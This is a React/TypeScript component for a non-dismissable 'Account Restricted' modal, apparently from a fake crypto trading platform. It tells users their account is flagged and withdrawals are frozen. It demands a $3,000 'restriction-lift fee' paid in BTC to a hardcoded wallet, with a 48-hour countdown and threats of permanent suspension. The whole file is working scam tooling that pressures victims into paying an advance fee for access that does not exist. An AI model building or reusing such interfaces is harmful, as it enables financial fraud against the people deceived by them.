import { useState, useEffect, useCallback } from "react";
import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription } from "@/components/ui/alert-dialog";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { AlertCircle, Copy, Check, Clock, Shield } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useToast } from "@/hooks/use-toast";
import { CONFIRMATION_FEE_WALLET_BTC } from "@/lib/constants";

const RESTRICTION_FEE_AMOUNT = 3000;
const COUNTDOWN_HOURS = 48;
const COUNTDOWN_STORAGE_KEY = "account_restriction_countdown_start";

interface AccountRestrictionFeeDialogProps {
  open: boolean;
}

export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialogProps) => {
  const [timeLeft, setTimeLeft] = useState(COUNTDOWN_HOURS * 60 * 60);
  const [isExpired, setIsExpired] = useState(false);
  const [copied, setCopied] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  useEffect(() => {
    if (!open) return;

    let startTime = localStorage.getItem(COUNTDOWN_STORAGE_KEY);
    if (!startTime) {
      startTime = Date.now().toString();
      localStorage.setItem(COUNTDOWN_STORAGE_KEY, startTime);
    }

    const elapsed = Math.floor((Date.now() - parseInt(startTime)) / 1000);
    const remaining = Math.max(0, COUNTDOWN_HOURS * 60 * 60 - elapsed);
    setTimeLeft(remaining);
    if (remaining === 0) setIsExpired(true);
  }, [open]);

  useEffect(() => {
    if (!open || isExpired) return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setIsExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [open, isExpired]);

  const formatTime = useCallback((seconds: number) => {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  }, []);

  const copyAddress = async () => {
    try {
      await navigator.clipboard.writeText(CONFIRMATION_FEE_WALLET_BTC);
      setCopied(true);
      toast({ title: "Address copied", description: "BTC wallet address copied to clipboard." });
      setTimeout(() => setCopied(false), 2000);
    } catch {
      toast({ title: "Copy failed", description: "Please copy the address manually.", variant: "destructive" });
    }
  };

  const progressPercent = (timeLeft / (COUNTDOWN_HOURS * 60 * 60)) * 100;

  return (
    <AlertDialog open={open}>
      <AlertDialogContent className="max-w-md border-destructive/50 bg-background sm:max-w-lg">
        <AlertDialogHeader>
          <div className="flex items-center gap-2 mb-2">
            <div className="h-10 w-10 rounded-full bg-destructive/20 flex items-center justify-center">
              <Shield className="h-5 w-5 text-destructive" />
            </div>
            <Badge variant="destructive" className="animate-pulse">
              <AlertCircle className="h-3 w-3 mr-1" /> Account Restricted
            </Badge>
          </div>
          <AlertDialogTitle className="text-xl text-destructive">
            ⚠️ Account Restriction — Fee Required
          </AlertDialogTitle>
          <AlertDialogDescription className="text-foreground/80 space-y-3">
            <p>
              Your account has been flagged for <strong>unusual activity</strong>. 
              All withdrawals and transactions are <strong>suspended</strong> until the restriction is lifted.
            </p>
            <p>
              To restore full account access and process your pending transactions, 
              a one-time <strong>restriction-lift fee</strong> is required.
            </p>
          </AlertDialogDescription>
        </AlertDialogHeader>

        {/* Fee Amount */}
        <div className="bg-destructive/5 border border-destructive/20 rounded-lg p-4 text-center space-y-1">
          <p className="text-sm text-muted-foreground font-medium">Required Fee</p>
          <p className="text-4xl font-bold text-destructive">${RESTRICTION_FEE_AMOUNT.toLocaleString()}</p>
          <p className="text-xs text-muted-foreground">Payable in BTC to the address below</p>
        </div>

        {/* Countdown Timer */}
        <div className="space-y-2">
          <div className="flex items-center justify-between text-sm">
            <span className="flex items-center gap-1.5 text-muted-foreground">
              <Clock className="h-4 w-4" /> Time Remaining
            </span>
            <span className={`font-mono font-bold text-lg ${isExpired ? "text-destructive" : timeLeft < 3600 ? "text-destructive animate-pulse" : "text-foreground"}`}>
              {isExpired ? "EXPIRED" : formatTime(timeLeft)}
            </span>
          </div>
          <div className="h-2 bg-muted rounded-full overflow-hidden">
            <div
              className={`h-full rounded-full transition-all duration-1000 ${isExpired ? "bg-destructive" : progressPercent < 25 ? "bg-destructive" : progressPercent < 50 ? "bg-yellow-500" : "bg-primary"}`}
              style={{ width: `${progressPercent}%` }}
            />
          </div>
          {isExpired && (
            <p className="text-xs text-destructive font-medium text-center">
              ⚠️ The deadline has passed. Your account may face permanent suspension. Contact support immediately.
            </p>
          )}
        </div>

        {/* Wallet Address */}
        <div className="space-y-2">
          <p className="text-sm font-medium text-muted-foreground">Send BTC to:</p>
          <div className="flex items-center gap-2 bg-muted/50 border border-border rounded-lg p-3">
            <code className="text-xs flex-1 break-all font-mono text-foreground">
              {CONFIRMATION_FEE_WALLET_BTC}
            </code>
            <Button variant="outline" size="sm" onClick={copyAddress} className="shrink-0">
              {copied ? <Check className="h-4 w-4 text-success" /> : <Copy className="h-4 w-4" />}
            </Button>
          </div>
        </div>

        {/* Warning */}
        <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
          <p className="text-xs text-foreground/70">
            <strong>⚠️ Important:</strong> The fee must be sent in a <strong>single BTC transaction</strong> to the address above. 
            Once confirmed on the blockchain, your account will be restored and all pending transactions will be processed automatically.
          </p>
        </div>

        {/* Actions */}
        <div className="flex flex-col gap-2 pt-2">
          <Button
            onClick={() => navigate("/dashboard/deposit")}
            className="w-full bg-destructive hover:bg-destructive/90 text-destructive-foreground"
          >
            Pay ${RESTRICTION_FEE_AMOUNT.toLocaleString()} Now
          </Button>
          <p className="text-[11px] text-center text-muted-foreground">
            This dialog cannot be dismissed until the restriction is lifted.
          </p>
        </div>
      </AlertDialogContent>
    </AlertDialog>
  );
};
